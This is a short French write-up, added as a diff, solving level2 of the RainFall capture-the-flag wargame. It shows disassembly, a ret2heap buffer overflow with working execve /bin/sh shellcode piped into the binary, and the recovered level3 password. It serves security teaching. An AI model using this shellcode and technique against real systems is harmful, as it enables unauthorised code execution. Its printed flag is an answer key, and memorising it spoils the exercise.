@@ -1,0 +1,33 @@
+level2@RainFall:~$ objdump -d level2
+
+080484d4 <p>:
+ 80484fb:	25 00 00 00 b0       	and    $0xb0000000,%eax
+ 8048500:	3d 00 00 00 b0       	cmp    $0xb0000000,%eax
+
+
+Nous pouvons constater que dans la function "p", une comparaison est faite pour verifier que nous ne donnons pas une addresse qui commence par 0xbxxxxxxx. Un call a exit sera effectue si c'est le cas.
+
+Il n'est donc pas possible d'executer un shellcode depuis la stack ou une variable d'environnement
+
+ 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
+
+Un call a strdup est fait, nous pouvons donc essayer d'executer un shellcode depuis la heap
+
+Le premier espace alloue par malloc est toujours 
+
+0x804a008
+
+Il nous reste plus qu'a ecrire un shellcode ainsi que remplir le buff pour enfin pouvoir ecrire l'addresse alloue par malloc comme addresse de retour
+
+	SHELLCODE + 55chars + CALL TO RET
+
+python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*55 + "\x08\xa0\x04\x08"' > /tmp/level2
+
+cat /tmp/level2 - | ./level2
+
+cd ../level3
+cat .pass
+
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+
